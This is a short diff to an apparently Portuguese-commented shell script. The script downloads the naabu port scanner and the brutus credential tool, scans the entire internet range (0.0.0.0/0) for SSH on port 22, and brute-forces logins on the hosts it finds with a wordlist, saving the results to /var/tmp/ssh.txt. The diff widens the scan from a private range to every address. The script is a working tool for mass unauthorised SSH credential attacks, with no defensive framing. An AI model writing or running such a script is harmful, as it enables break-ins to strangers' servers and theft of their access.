@@ -4,6 +4,12 @@
 #abaixa brute golang naabu
 
 
+#while true 
+
+
+
+
+
 go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
 url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
 url_brutus='https://github.com/praetorian-inc/brutus/releases/download/v1.10.0/brutus-linux-amd64.tar.gz' 
@@ -24,10 +30,11 @@ tar -xf brutus
 chmod  +x brutus 
 
 
-timeout  10s     ./nabu  -p 22 -host 192.168.1.1/10  > ips_nabu     #120  segundos para  pega os ips
+timeout  10s     ./nabu  -p 22 -host    0.0.0.0/0     >    ips_nabu     #120  segundos para  pega os ips
  
 
-./brutus creds   --targets-file  ips_nabu     -U  lista.txt   -P lista.txt   -q     >     /var/tmp/ssh.txt
+
+./brutus creds   --targets-file  ips_nabu     -U  lista.txt   -P  lista.txt   -q     >     /var/tmp/ssh.txt
 
 
 
